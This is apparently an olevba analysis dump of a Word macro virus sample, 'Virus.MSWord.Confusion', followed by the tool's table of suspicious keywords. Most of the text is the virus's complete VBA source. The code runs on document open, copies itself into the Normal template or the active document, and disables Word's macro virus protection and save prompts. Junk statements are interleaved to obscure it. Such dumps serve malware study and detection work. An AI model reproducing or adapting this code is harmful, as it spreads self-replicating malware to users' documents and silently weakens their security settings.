olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Confusion
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Confusion - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
A1 = System.Country
Set A = ThisDocument
gh = Application.DisplayAlerts
With A
Set dfg = Word.System
Set B = .VBProject
If Application.Documents.Count = 0 Then gfs = Application.Caption
End With
Author = "Lys Kovick"
With B
Application.Visible = True
Set C = .VBComponents
If C1 = Application.Version Then Beep
End With
kgb = afterme
With C
CPU = System.ProcessorType
Set D = .Item(1)
R = U = Confused
End With
ICU = DoUCMe
With D
BSBSBS = Application.Caption
Set E = .CodeModule
OS = System.OperatingSystem
End With
TD = ThisDocument
With E
A1 = System.Country
F = .Lines(1, .CountOfLines)
gh = Application.DisplayAlerts
End With
Set dfg = Word.System
If A = ActiveDocument Then
If Application.Documents.Count = 0 Then gfs = Application.Caption
Set G = NormalTemplate
Author = "Lys Kovick"
Else
Application.Visible = True
Set G = ActiveDocument
If C1 = Application.Version Then Beep
End If
kgb = afterme
With G
CPU = System.ProcessorType
Set H = .VBProject
R = U = Confused
End With
ICU = DoUCMe
With H
BSBSBS = Application.Caption
Set I = .VBComponents
OS = System.OperatingSystem
End With
TD = ThisDocument
With I
A1 = System.Country
Set J = .Item(1)
gh = Application.DisplayAlerts
End With
Set dfg = Word.System
With J
If Application.Documents.Count = 0 Then gfs = Application.Caption
Set K = .CodeModule
Author = "Lys Kovick"
End With
Application.Visible = True
With K
If C1 = Application.Version Then Beep
.DeleteLines 1, .CountOfLines
kgb = afterme
End With
CPU = System.ProcessorType
With K
R = U = Confused
.AddFromString F
ICU = DoUCMe
End With
BSBSBS = Application.Caption
Set L = Options
OS = System.OperatingSystem
With L
TD = ThisDocument
.ConfirmConversions = 0
A1 = System.Country
End With
gh = Application.DisplayAlerts
With L
Set dfg = Word.System
.SaveNormalPrompt = 0
If Application.Documents.Count = 0 Then gfs = Application.Caption
End With
Author = "Lys Kovick"
With L
Application.Visible = True
.VirusProtection = 0
If C1 = Application.Version Then Beep
End With
kgb = afterme
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Application.Visible |May hide the application                     |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
+----------+--------------------+---------------------------------------------+

